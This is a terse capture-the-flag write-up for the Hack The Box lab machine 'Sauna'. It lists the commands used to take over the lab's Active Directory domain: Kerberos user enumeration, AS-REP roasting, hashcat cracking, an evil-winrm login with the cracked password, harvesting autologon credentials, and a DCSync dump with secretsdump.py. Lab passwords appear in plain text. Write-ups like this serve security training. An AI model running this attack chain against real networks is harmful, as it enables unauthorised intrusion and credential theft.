# Sauna  

## Nmap  

All ports.  

```
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-04-20 15:28:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```  

## HTTP 80  

Users found on website.  

```
Johnson
Watson
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
Hugo Smith
```  

Recent tags, not sure if these are anything.  

```
dfre
Gahydwq
qeers
hysert
hjwsa
sumgr
nhyewq
njyra
laiuwa
loghw
mhyu
mojjs
suisq
bhyfgh
```  

## Kerbrute  

Finding users with kerbrute.  

`kerbrute userenum --dc 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL sauna-users.txt`  

Results.  

```
2023/04/20 12:19:51 >  [+] VALID USERNAME:	 FSmith@EGOTISTICAL-BANK.LOCAL
2023/04/20 12:19:51 >  [+] VALID USERNAME:	 HSmith@EGOTISTICAL-BANK.LOCAL
```  

## TGT  

Getting a TGT for users.  

`GetNPUsers.py EGOTISTICAL-BANK.LOCAL/FSmith`  

## Password hash cracking  

Find module for hashcat.  

`hashcat --example-hashes | grep -B 2 krb5asrep`  

Cracking.  

`hashcat -a 0 -m 18200 tgt.hash.fsmith /usr/share/wordlists/rockyou.txt`  

Creds for FSmith.  

`Thestrokes23`  


## Shell  

Login.  

`evil-winrm -i 10.129.95.180 -u FSmith -p "Thestrokes23"`  

## Privesc  

Finding automatic logon creds with winPEASx64.exe  

```
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```  

## Domain Admin  

Using bloodhound, I found svc_loanmanager has DCsync rights. Using secretsdump.py.  

`secretsdump.py  egotistical-bank.local/svc_loanmgr@10.129.95.180`  

Using the administrator hash and evil-winrm to root the box.
